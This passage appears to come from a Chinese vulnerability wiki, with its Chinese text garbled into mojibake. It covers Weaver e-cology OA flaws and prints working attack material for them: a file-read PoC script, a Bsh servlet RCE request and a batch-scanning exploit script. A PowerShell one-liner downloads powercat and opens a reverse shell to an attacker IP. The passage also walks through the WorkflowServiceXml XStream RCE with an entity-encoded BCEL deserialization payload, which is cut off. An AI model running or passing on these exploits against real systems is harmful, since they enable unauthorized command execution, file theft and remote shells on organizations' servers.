Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) response.encoding = 'GBK' print(\"\\033[32m[o] ÊàêÂäüËØªÂèñÔºö\\n\\033[0m{}\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) # windows Êñá‰ª∂ËØªÂèñ def POC_3(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/{}&fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] ÊàêÂäüËé∑ÂèñidÔºö{}\\033[0m\".format(id)) POC_2(target_url, id) except : print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•ÔºåÊó†Ê≥ïËØªÂèñÊñá‰ª∂ \\033[0m)\") # linuxËØªÂèñÊñá‰ª∂ def POC_4(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{}&fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] ÊàêÂäüËé∑ÂèñidÔºö{}\\033[0m\".format(id)) POC_2(target_url, id) except: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•ÔºåÊó†Ê≥ïËØªÂèñÊñá‰ª∂ \\033[0m)\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) id,system = POC_1(target_url) POC_2(target_url, id) while True: if system == \"windows\": File = input(\"\\033[35mFile >>> \\033[0m\") if File == \"exit\": sys.exit(0) else: POC_3(target_url, File) if system == \"linux\": File = input(\"\\033[35mFile >>> \\033[0m\") if File == \"exit\": sys.exit(0) else: POC_4(target_url, File) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA Bsh ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CNVD-2019-32204.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA Bsh ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CNVD-2019-32204.html","title":"Ê≥õÂæÆOA Bsh ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CNVD-2019-32204","keywords":"","body":"Ê≥õÂæÆOA Bsh ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CNVD-2019-32204 ÊºèÊ¥ûÊèèËø∞ 2019Âπ¥9Êúà17Êó•Ê≥õÂæÆOAÂÆòÊñπÊõ¥Êñ∞‰∫Ü‰∏Ä‰∏™ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûË°•‰∏Å, Ê≥õÂæÆe-cology OAÁ≥ªÁªüÁöÑJava BeanshellÊé•Âè£ÂèØË¢´Êú™ÊéàÊùÉËÆøÈóÆ, ÊîªÂáªËÄÖË∞ÉÁî®ËØ•BeanshellÊé•Âè£, ÂèØÊûÑÈÄ†ÁâπÂÆöÁöÑHTTPËØ∑Ê±ÇÁªïËøáÊ≥õÂæÆÊú¨Ë∫´‰∏Ä‰∫õÂÆâÂÖ®ÈôêÂà∂‰ªéËÄåËææÊàêËøúÁ®ãÂëΩ‰ª§ÊâßË°å, ÊºèÊ¥ûÁ≠âÁ∫ß‰∏•Èáç. FOFA [!NOTE] app=‚ÄúÊ≥õÂæÆ-ÂçèÂêåÂäûÂÖ¨OA‚Äù ÂΩ±ÂìçÁâàÊú¨ [!NOTE] E-cology 7.0 E-cology 8.0 E-cology 8.1 E-cology 9.0 ÊºèÊ¥ûÂ§çÁé∞ Áõ¥Êé•Âú®ÁΩëÁ´ôÊ†πÁõÆÂΩïÂêéÂä†ÂÖ•ÁªÑ‰ª∂ËÆøÈóÆË∑ØÂæÑ /weaver/bsh.servlet.BshServlet/ÔºåÂ¶Ç‰∏ãÂõæÂú®victim‰∏äÊâßË°å‰∫ÜÂëΩ‰ª§‚Äúwhoami‚Äù ËØ∑Ê±ÇÂåÖ‰∏∫ POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=ex\\u0065c(\"cmd /c dir\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw ÂÖ≥‰∫éÁªïËøá eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\"); ex\\u0065c(\"cmd /c dir\"); IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd ÊºèÊ¥ûPOC https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204 #/usr/bin/python #coding:utf-8 #Author:Ja0k #For Weaver-Ecology-OA_RCE import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) import requests,sys headers = { 'Content-Type': 'text/xml; charset=utf-8', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0', 'Cache-Control': 'max-age=0', 'Content-Type': 'application/x-www-form-urlencoded', 'Upgrade-Insecure-Requests': '1', 'Content-Length': '578' } proxies= {'http':'http://127.0.0.1:8080'} def Poc_check(target): Url_Payload1=\"/bsh.servlet.BshServlet\" Url_Payload2=\"/weaver/bsh.servlet.BshServlet\" Url_Payload3=\"/weaveroa/bsh.servlet.BshServlet\" Url_Payload4=\"/oa/bsh.servlet.BshServlet\" Data_Payload1=\"\"\"bsh.script=exec(\"whoami\");&bsh.servlet.output=raw\"\"\" Data_Payload2= \"\"\"bsh.script=\\u0065\\u0078\\u0065\\u0063(\"whoami\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\"\"\" Data_Payload3= \"\"\"bsh.script=eval%00(\"ex\"%2b\"ec(bsh.httpServletRequest.getParameter(\\\\\"command\\\\\"))\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami\"\"\" for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4): url= target + Url_Payload for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): try: http_response = requests.post(url,data=Data_payload,headers=headers,verify=False) #print http_response.status_code if http_response.status_code == 200: if \";\" not in (http_response.content): if \"Login.jsp\" not in (http_response.content): if \"Error\" not in (http_response.content): print \"{0} is a E-cologyOA_RCE Vulnerability\".format(url) print \"Server Current UsernameÔºö{0}\".format(http_response.content) elif http_response.status_code == 500: print \"{0}500 maybe is Weaver-EcologyOAÔºåPlease confirm by yourself \".format(url) else: pass except Exception,Error: pass if __name__ == '__main__': for line in open(sys.argv[1]).readlines(): target=line.strip() Poc_check(target) #1.install python Dependencies Library pip install requests #2.ÊâπÈáèËÑöÊú¨ ÊâßË°å python Weaver-Ecology-OA_RCE-exp.py url.txtÊñá‰ª∂‰∏≠ ÊòØurlÂú∞ÂùÄ ÈúÄË¶ÅÂ∏¶httpÂçèËÆÆ Êúâ‰ªª‰ΩïÈóÆÈ¢òËØ∑issue Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆE-Cology WorkflowServiceXml RCE.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆE-Cology WorkflowServiceXml RCE.html","title":"Ê≥õÂæÆE-Cology WorkflowServiceXml RCE","keywords":"","body":"Ê≥õÂæÆE-Cology WorkflowServiceXml RCE ÊºèÊ¥ûÊèèËø∞ Ê≥õÂæÆE-cology OAÁ≥ªÁªüÁöÑWorkflowServiceXmlÊé•Âè£ÂèØË¢´Êú™ÊéàÊùÉËÆøÈóÆÔºåÊîªÂáªËÄÖË∞ÉÁî®ËØ•Êé•Âè£ÔºåÂèØÊûÑÈÄ†ÁâπÂÆöÁöÑHTTPËØ∑Ê±ÇÁªïËøáÊ≥õÂæÆÊú¨Ë∫´‰∏Ä‰∫õÂÆâÂÖ®ÈôêÂà∂‰ªéËÄåËææÊàêËøúÁ®ã‰ª£Á†ÅÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] E-cology FOFA [!NOTE] app=\"Ê≥õÂæÆ-ÂçèÂêåÂäûÂÖ¨OA\" ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÂéüÁêÜÊù•Ê∫ê https://www.anquanke.com/post/id/239865 Ê†πÊçÆÊµÅÈáèÂèØ‰ª•ÂæóÁü•Ë∑ØÁî±‰∏∫/services%20/WorkflowServiceXmlÔºåÊàëÈöèÂç≥Êü•Áúã‰∫ÜËØ•OAÁöÑweb.xml„ÄÇ ÂèëÁé∞‰∫ÜÁõ∏ÂÖ≥Á±ª‰∏∫weaver.workflow.webservices.WorkflowServiceXml„ÄÅweaver.workflow.webservices.WorkflowServiceImplXml„ÄÇ ÂÖ≥‰∫éÁ±ªÁöÑ‰∏úË•øÂÖàÊîæÂà∞‰∏ÄÊóÅÔºåÊØïÁ´üË∑ØÁî±ÊòØÂê¶ÁúüÂÆûÂ≠òÂú®„ÄÅ%20Êúâ‰ªÄ‰πàÊÑè‰πâÊâçÊòØÈáçÁÇπ„ÄÇÊàëÂºÄÂßãÈ™åËØÅË∑ØÁî±ÁöÑÂ≠òÂú®„ÄÇËøôÈáåÊàëÊµãËØï‰∫Ü‰∏§‰∏™ÁâàÊú¨„ÄÇ Â∏¶‰∏ä%20ËØïËØï Ê†πÊçÆËøô‰∏™responseÂèØ‰ª•ÁúãÂá∫ËøôÂ∫îËØ•ÊòØ‰∏Ä‰∏™soap xmlÊ≥®ÂÖ•ÔºåÂÖ∑‰ΩìÊòØXMLDecoder„ÄÅXStreamÊàñËÄÖÂÖ∂‰ªñ‰ªÄ‰πàÔºåËøòÂæóÁúãweaver.workflow.webservices.WorkflowServiceXml„ÄÅweaver.workflow.webservices.WorkflowServiceImplXml. È¶ñÂÖàÔºåÂÖàÁúãÁúãweaver.workflow.webservices.WorkflowServiceXml ÂèØ‰ª•Ê≥®ÊÑèÂà∞ËøôÊòØ‰∏Ä‰∏™Êé•Âè£Á±ªÔºåÂÖ∂‰∏≠‰∏Ä‰∏™ÊñπÊ≥ïdoCreateWorkflowRequestÊØîËæÉÂèØÁñë„ÄÇ Âéªweaver.workflow.webservices.WorkflowServiceImplXmlÁúãÁúãËøô‰∏™ÊñπÊ≥ïÁöÑÂÆûÁé∞„ÄÇ ÁªßÁª≠Ë∑üË∏™ÁúãÁúã Ëøô‰∏™xsÂíãÁúãËµ∑Êù•Ëøô‰πàÁúºÁÜüÔºüÁúãÁúãxsÊòØ‰∏™Âï•Ôºå‰∏ÄËà¨JavaÂèØËÉΩ‰ºöÂÆö‰πâÂú®‰ª£Á†ÅÊñá‰ª∂ÊúÄ‰∏äÊñπ„ÄÇ ÂéüÊù•xsÊòØXStreamÁöÑÂØπË±° Êó¢ÁÑ∂ÂÜ≥ÂÆö‰∫ÜsinkÁÇπÔºå‰∏ã‰∏ÄÊ≠•ËÇØÂÆöÊòØPOCÁöÑÊí∞ÂÜô‰∫ÜÔºåÂÖàÁ°ÆÂÆöSOAPÂü∫Êú¨Ê®°Êùø„ÄÇ Ê†πÊçÆÊúãÂèãÁªôÁöÑÊµÅÈáèÂèØ‰ª•Á°ÆÂÆöÂü∫Êú¨SOAPÊ∂àÊÅØ‰ΩìÊ®°ÊùøÂ§ßËá¥ÊòØËøôÊ†∑ÁöÑ„ÄÇ 2 È™åËØÅÊàêÂäü„ÄÇ Êé•‰∏ãÊù•Â∞±ÊòØÂØªÊâægadget‰∫Ü„ÄÇ Áî±‰∫éÂπ∂Ê≤°ÊúâÂÆåÊï¥Ê∫êÁ†ÅÔºåÂè™ÊúâÈÉ®ÂàÜgithubÊ∫êÁ†ÅÔºå‰∏çËÉΩÁ°ÆÂÆögadgetÔºåÂÖà‰ΩøÁî®URLDNSËØïËØï„ÄÇ http://1xsz12.dnslog.cn http://1xsz12.dnslog.cn ÁªÑÂêàÊàë‰ª¨ÁöÑÊ®°ÊùøËØïËØï„ÄÇ ËøôÈáåÊ∂âÂèäÂà∞ÂÆû‰ΩìÁºñÁ†ÅÈóÆÈ¢òÔºå‰Ωú‰∏∫Êáí‰∫∫Áõ¥Êé•ÈÄâÊã©Êï¥‰ΩìÁºñÁ†ÅÁÆó‰∫Ü„ÄÇ ÈöèÂêédnslogÊàêÂäüÊî∂Âà∞ËØ∑Ê±Ç„ÄÇ ÊºèÊ¥ûPOC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Ê≥õÂæÆE-Cology WorkflowServiceXml RCE \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/services%20/WorkflowServiceXml\" cmd = \"net user\" headers = { 'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)', 'SOAPAction': '\"\"', 'Cmd': cmd, \"Content-Type\": \"text/xml;charset=UTF-8\" } data = ''' &#x3c;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x20;&#x73;&#x65;&#x72;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x27;&#x63;&#x75;&#x73;&#x74;&#x6f;&#x6d;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x3c;&#x75;&#x6e;&#x73;&#x65;&#x72;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x62;&#x6c;&#x65;&#x2d;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x3c;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x69;&#x7a;&#x65;&#x3e;&#x32;&#x3c;&#x2f;&#x73;&#x69;&#x7a;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6d;&#x70;&#x61;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x66;&#x78;&#x2e;&#x63;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x2e;&#x4f;&#x62;&#x73;&#x65;&#x72;&#x76;&#x61;&#x62;&#x6c;&#x65;&#x4c;&#x69;&#x73;&#x74;&#x24;&#x31;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x6e;&#x74;&#x3e;&#x33;&#x3c;&#x2f;&#x69;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x61;&#x74;&#x61;&#x48;&#x61;&#x6e;&#x64;&#x6c;&#x65;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x61;&#x74;&#x61;&#x53;&#x6f;&#x75;&#x72;&#x63;&#x65;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x77;&#x73;&#x2e;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x58;&#x4d;&#x4c;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x24;&#x58;&#x6d;&#x6c;&#x44;&#x61;&#x74;&#x61;&#x53;&#x6f;&#x75;&#x72;&#x63;&#x65;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x54;&#x79;&#x70;&#x65;&#x3e;&#x74;&#x65;&#x78;&#x74;&#x2f;&#x70;&#x6c;&#x61;&#x69;&#x6e;&#x3c;&#x2f;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x54;&#x79;&#x70;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x69;&#x6f;&#x2e;&#x53;&#x65;&#x71;&#x75;&#x65;&#x6e;&#x63;&#x65;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x65;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x78;&#x2e;&#x73;&#x77;&#x69;&#x6e;&#x67;&#x2e;&#x4d;&#x75;&#x6c;&#x74;&#x69;&#x55;&#x49;&#x44;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x73;&#x24;&#x4d;&#x75;&#x6c;&#x74;&#x69;&#x55;&#x49;&#x44;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x73;&#x45;&#x6e;&#x75;&#x6d;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x74;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x74;&#x6f;&#x6f;&#x6c;&#x73;&#x2e;&#x6a;&#x61;&#x76;&#x61;&#x63;&#x2e;&#x70;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x69;&#x6e;&#x67;&#x2e;&#x4a;&#x61;&#x76;&#x61;&#x63;&#x50;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x69;&#x6e;&#x67;&#x45;&#x6e;&#x76;&#x69;&#x72;&#x6f;&#x6e;&#x6d;&#x65;&#x6e;&#x74;&#x24;&#x4e;&#x61;&#x6d;&#x65;&#x50;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x49;&#x74;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6e;&#x61;&#x6d;&#x65;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x41;&#x62;&#x73;&#x74;&#x72;&#x61;&#x63;&#x74;&#x4c;&#x69;&#x73;&#x74;&#x24;&#x49;&#x74;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x75;&#x72;&#x73;&#x6f;&#x72;&#x3e;&#x30;&#x3c;&#x2f;&#x63;&#x75;&#x72;&#x73;&#x6f;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6c;&#x61;&#x73;&#x74;&#x52;&#x65;&#x74;&#x3e;&#x2d;&#x31;&#x3c;&#x2f;&#x6c;&#x61;&#x73;&#x74;&#x52;&#x65;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x65;&#x78;&#x70;&#x65;&#x63;&#x74;&#x65;&#x64;&#x4d;&#x6f;&#x64;&#x43;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x30;&#x3c;&#x2f;&#x65;&#x78;&#x70;&#x65;&#x63;&#x74;&#x65;&#x64;&#x4d;&#x6f;&#x64;&#x43;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6f;&#x75;&#x74;&#x65;&#x72;&#x2d;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x41;&#x72;&#x72;&#x61;&#x79;&#x73;&#x24;&#x41;&#x72;&#x72;&#x61;&#x79;&#x4c;&#x69;&#x73;&#x74;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x61;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x2d;&#x61;&#x72;&#x72;&#x61;&#x79;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x24;&#x24;&#x42;&#x43;&#x45;&#x4c;&#x24;&#x24;&#x24;&#x6c;&#x24;&#x38;&#x62;&#x24;&#x49;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x38;&#x35;&#x56;&#x24;&#x35;&#x62;&#x57;&#x24;&#x54;&#x57;&#x24;&#x55;&#x24;&#x66;&#x65;&#x24;&#x38;&#x36;&#x24;&#x71;&#x24;&#x63;&#x63;&#x30;&#x24;&#x4d;&#x24;&#x38;&#x32;&#x41;&#x24;&#x38;&#x34;&#x24;&#x61;&#x38;&#x24;&#x62;&#x64;&#x24;&#x64;&#x38;&#x56;&#x24;&#x4e;&#x24;&#x75;&#x24;&#x38;&#x39;&#x24;&#x64;&#x36;&#x24;&#x64;&#x65;&#x24;&#x4d;&#x24;&#x64;&#x36;&#x24;&#x38;&#x61;&#x24;&#x35;&#x63;&#x24;&#x65;&#x61;&#x24;&#x72;&#x24;&#x61;&#x30;&#x35;&#x24;&#x55;&#x24;&#x78;&#x24;&#x64;&#x61;&#x24;&#x65;&#x61;&#x30;&#x24;&#x69;&#x61;&#x24;&#x71;&#x24;&#x39;&#x39;&#x24;&#x38;&#x39;&#x24;&#x39;&#x33;&#x24;&#x4a;&#x50;&#x24;&#x37;&#x62;&#x24;&#x62;&#x31;&#x24;&#x61;&#x64;&#x24;&#x62;&#x64;&#x24;&#x64;&#x66;&#x24;&#x65;&#x66;&#x24;&#x61;&#x64;&#x24;&#x62;&#x64;&#x24;&#x62;&#x63;&#x24;&#x66;&#x38;&#x24;&#x65;&#x32;&#x53;&#x24;&#x6c;&#x24;&#x35;&#x63;&#x24;&#x61;&#x62;&#x24;&#x78;&#x6a;&#x24;&#x35;&#x62;&#x24;&#x62;&#x62;&#x24;&#x64;&#x61;&#x24;&#x33;&#x65;&#x24;&#x66;&#x36;&#x47;&#x69;&#x24;&#x62;&#x66;&#x33;&#x24;&#x4a;&#x24;&#x39;&#x34;&#x24;&#x39;&#x30;&#x24;&#x61;&#x38;&#x24;&#x61;&#x63;&#x24;&#x63;&#x35;&#x24;&#x39;&#x39;&#x39;&#x24;&#x66;&#x62;&#x24;&#x37;&#x63;&#x24;&#x66;&#x62;&#x24;&#x66;&#x36;&#x24;&#x65;&#x64;&#x24;&#x62;&#x64;&#x4f;&#x24;&#x65;&#x36;&#x24;&#x64;&#x66;&#x24;&#x35;&#x62;&#x24;&#x62;&#x66;&#x24;&#x66;&#x64;&#x24;&#x4a;&#x24;&#x65;&#x30;&#x31;&#x24;&#x66;&#x63;&#x24;&#x61;&#x63;&#x24;&#x61;&#x33;&#x24;&#x4a;&#x24;&#x38;&#x37;&#x74;&#x24;&#x61;&#x34;&#x31;&#x24;&#x6f;&#x24;&#x39;&#x37;&#x51;&#x24;&#x4e;&#x24;&#x38;&#x37;&#x75;&#x24;&#x69;&#x24;&#x63;&#x31;&#x73;&#x24;&#x67;&#x24;&#x38;&#x65;&#x24;&#x61;&#x61;&#x24;&#x63;&#x38;&#x24;&#x65;&#x38;&#x50;&#x31;&#x24;&#x61;&#x36;&#x24;&#x65;&#x32;&#x79;&#x24;&#x6a;&#x24;&#x65;&#x33;&#x38;&#x24;&#x73;&#x24;&#x39;&#x31;&#x24;&#x5f;&#x48;&#x24;&#x63;&#x39;&#x71;&#x24;&#x4e;&#x24;&#x54;&#x24;&#x66;&#x32;&#x79;&#x42;&#x24;&#x63;&#x37;&#x49;&#x24;&#x62;&#x63;&#x24;&#x75;&#x24;&#x39;&#x37;&#x24;&#x39;&#x37;&#x34;&#x24;&#x39;&#x63;&#x52;&#x71;&#x5a;&#x24;&#x38;&#x33;&#x24;&#x61;&#x39;&#x24;&#x70;&#x24;&#x38;&#x61;&#x49;&#x24;&#x4e;&#x24;&#x39;&#x36;&#x24;&#x38;